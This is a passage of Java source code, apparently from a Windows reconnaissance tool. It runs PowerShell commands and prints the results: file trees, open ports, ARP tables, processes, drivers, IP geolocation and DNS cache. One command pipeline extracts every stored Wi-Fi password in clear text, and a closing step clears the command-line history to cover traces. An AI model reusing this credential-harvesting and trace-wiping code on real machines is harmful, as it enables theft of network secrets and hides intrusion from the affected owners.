        BufferedReader stdout15t = new BufferedReader(new InputStreamReader(
          powerShellProcess15t.getInputStream()));
        while ((line15t = stdout15t.readLine()) != null) {
         System.out.println(line15t);
        }
        stdout15t.close();
        

        BufferedReader stderr15t = new BufferedReader(new InputStreamReader(
          powerShellProcess15t.getErrorStream()));
        while ((line15t = stderr15t.readLine()) != null) {
         System.out.println("Standard Error: " + line15t);
        }
        stderr15t.close();
        System.out.println("\n\nDone - Output: >tree C:\\Users\\" + User + "\\OneDrive /F");
        
        //netstat -aon
        System.out.println("\n\n##########################################################################################");
        System.out.println("\t\t\t\t\t\t\t\t\tnetstat -aon ");
        System.out.println("\t\t\t\t\t\t\t   (Displays all ports)");
        System.out.println("##########################################################################################");
        powerShellProcess16.getOutputStream().close();
        String line16;
        System.out.println("\n\n\nStandard Output: >netstat -aon");
        BufferedReader stdout16 = new BufferedReader(new InputStreamReader(
          powerShellProcess16.getInputStream()));
        while ((line16 = stdout16.readLine()) != null) {
         System.out.println(line16);
        }
        stdout16.close();
        

        BufferedReader stderr16 = new BufferedReader(new InputStreamReader(
          powerShellProcess16.getErrorStream()));
        while ((line16 = stderr16.readLine()) != null) {
         System.out.println("Standard Error: " + line16);
        }
        stderr16.close();
        System.out.println("\n\nDone - netstat -aon");
        
        //arp -a
        System.out.println("\n\n##########################################################################################");
        System.out.println("\t\t\t\t\t\t\t\t\t\tarp -a ");
        System.out.println("\t\t\t\t(Which IPv4 address associated with witch MAC address)");
        System.out.println("##########################################################################################");
        powerShellProcess17.getOutputStream().close();
        String line17;
        System.out.println("\n\n\nStandard Output: >arp -a");
        BufferedReader stdout17 = new BufferedReader(new InputStreamReader(
          powerShellProcess17.getInputStream()));
        while ((line17 = stdout17.readLine()) != null) {
         System.out.println(line17);
        }
        stdout17.close();
        

        BufferedReader stderr17 = new BufferedReader(new InputStreamReader(
          powerShellProcess17.getErrorStream()));
        while ((line17 = stderr17.readLine()) != null) {
         System.out.println("Standard Error: " + line17);
        }
        stderr17.close();
        System.out.println("\n\nDone - arp -a");
        
        //Tasklist
        System.out.println("\n\n##########################################################################################");
        System.out.println("\t\t\t\t\t\t\t\t\tTasklist");
        System.out.println("\tDisplays a list of currently running processes on the local computer");
        System.out.println("##########################################################################################");
        powerShellProcess18.getOutputStream().close();
        String line18;
        System.out.println("\n\n\nStandard Output: >tasklist");
        BufferedReader stdout18 = new BufferedReader(new InputStreamReader(
          powerShellProcess18.getInputStream()));
        while ((line18 = stdout18.readLine()) != null) {
         System.out.println(line18);
        }
        stdout18.close();
        

        BufferedReader stderr18 = new BufferedReader(new InputStreamReader(
          powerShellProcess18.getErrorStream()));
        while ((line18 = stderr18.readLine()) != null) {
         System.out.println("Standard Error: " + line18);
        }
        stderr18.close();
        System.out.println("Done - tasklist");
        
        //Driverquery
        System.out.println("\n\n##########################################################################################");
        System.out.println("\t\t\t\t\t\t\t\t\tDriverquery");
        System.out.println("\tDisplay a list of installed device drivers and their properties.");
        System.out.println("##########################################################################################");
        powerShellProcess19.getOutputStream().close();
        String line19;
        System.out.println("\n\n\nStandard Output: >driverquery");
        BufferedReader stdout19 = new BufferedReader(new InputStreamReader(
          powerShellProcess19.getInputStream()));
        while ((line19 = stdout19.readLine()) != null) {
         System.out.println(line19);
        }
        stdout19.close();
        

        BufferedReader stderr19 = new BufferedReader(new InputStreamReader(
          powerShellProcess19.getErrorStream()));
        while ((line19  = stderr19.readLine()) != null) {
         System.out.println("Standard Error: " + line19);
        }
        stderr19.close();
        System.out.println("Done - driverquery");
        
        //Geolocation
        System.out.println("\n\n##########################################################################################");
        System.out.println("\t\t\t\t\t\t\t\t\tGeoLocation");
        System.out.println("##########################################################################################");
        powerShellProcess20.getOutputStream().close();
        String line20;
        System.out.println("\n\n\nStandard Output: >Invoke-RestMethod -Uri 'http://ipinfo.io'");
        BufferedReader stdout20 = new BufferedReader(new InputStreamReader(
          powerShellProcess20.getInputStream()));
        while ((line20 = stdout20.readLine()) != null) {
         System.out.println(line20);
        }
        stdout20.close();
        

        BufferedReader stderr20 = new BufferedReader(new InputStreamReader(
          powerShellProcess20.getErrorStream()));
        while ((line20  = stderr20.readLine()) != null) {
         System.out.println("Standard Error: " + line20);
        }
        stderr20.close();
        System.out.println("Done - GeoLocation");
        
        //BatteryStatus
        System.out.println("\n\n##########################################################################################");
        System.out.println("\t\t\t\t\t\t\t\t\tBattery Status");
        System.out.println("##########################################################################################");
        powerShellProcess21.getOutputStream().close();
        String line21;
        System.out.println("\n\n\nStandard Output: >Get-WmiObject -Class Win32_Battery");
        BufferedReader stdout21 = new BufferedReader(new InputStreamReader(
          powerShellProcess21.getInputStream()));
        while ((line21 = stdout21.readLine()) != null) {
         System.out.println(line21);
        }
        stdout21.close();
        

        BufferedReader stderr21 = new BufferedReader(new InputStreamReader(
          powerShellProcess21.getErrorStream()));
        while ((line21  = stderr21.readLine()) != null) {
         System.out.println("Standard Error: " + line21);
        }
        stderr21.close();
        System.out.println("Done - Batter Status");
        
        //WifiInfo
        System.out.println("\n\n##########################################################################################");
        System.out.println("\t\t\t\t\t\t\t\t\tWifi Info");
        System.out.println("##########################################################################################");
        powerShellProcess22.getOutputStream().close();
        String line22;
        System.out.println("\n\n\nStandard Output: >(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize ");
        BufferedReader stdout22 = new BufferedReader(new InputStreamReader(
          powerShellProcess22.getInputStream()));
        while ((line22 = stdout22.readLine()) != null) {
         System.out.println(line22);
        }
        stdout22.close();
        

        BufferedReader stderr22 = new BufferedReader(new InputStreamReader(
          powerShellProcess22.getErrorStream()));
        while ((line22  = stderr22.readLine()) != null) {
         System.out.println("Standard Error: " + line22);
        }
        stderr22.close();
        System.out.println("Done - Wifi Info");
        
        //ipconfig /Displaydns
        System.out.println("\n\n##########################################################################################");
        System.out.println("\t\t\t\t\t\t\t\t\tDisplay DNS");
        System.out.println("##########################################################################################");
        powerShellProcessDNS.getOutputStream().close();
        String lineDNS;
        System.out.println("\n\n\nStandard Output: >ipconfig /displaydns");
        BufferedReader stdoutDNS = new BufferedReader(new InputStreamReader(
          powerShellProcessDNS.getInputStream()));
        while ((lineDNS = stdoutDNS.readLine()) != null) {
         System.out.println(lineDNS);
        }
        stdoutDNS.close();
        

        BufferedReader stderrDNS = new BufferedReader(new InputStreamReader(
          powerShellProcessDNS.getErrorStream()));
        while ((lineDNS = stderrDNS.readLine()) != null) {
         System.out.println("Standard Error: " + lineDNS);
        }
        stderrDNS.close();
        System.out.println("Done - ipconfig /displaydns");
        
        //Clear-History
        //***********************************************************************************************************************
        powerShellProcessCH.getOutputStream().close();
        String lineCH;
        BufferedReader stdoutCH = new BufferedReader(new InputStreamReader(
          powerShellProcessCH.getInputStream()));
        while ((lineCH = stdoutCH.readLine()) != null) {
        }
        stdoutCH.close();
        

        BufferedReader stderrCH = new BufferedReader(new InputStreamReader(
          powerShellProcessCH.getErrorStream()));
        while ((lineCH = stderrCH.readLine()) != null) {
         System.out.println("Standard Error: " + lineCH);
        }
        stderrCH.close();
        System.out.println("\n\n\nCommand Line History has SUCCESSFULLY been cleared.");  
        
        //Use stored value for output stream 
        //System.setOut(console); 
        //System.out.println("This will be written on the console!"); 
		
		
	}

}
